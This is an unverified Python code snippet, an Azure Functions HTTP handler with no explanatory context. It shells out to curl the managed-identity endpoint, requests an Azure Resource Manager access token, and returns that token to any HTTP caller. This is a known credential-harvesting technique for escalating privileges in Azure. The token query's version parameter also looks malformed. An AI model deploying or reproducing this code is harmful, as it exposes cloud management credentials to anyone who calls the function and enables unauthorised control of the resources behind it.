---
id: 54fda0c7-9c24-4b8e-ba60-aca004a8569e
type: code
language: py
verified: false
created_at: '2023-05-24T16:02:35.131546+00:00'
updated_at: '2023-05-24T16:02:52.032347+00:00'
---

# Code Snippet 54fda0c7

**Language**: py

```py
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```
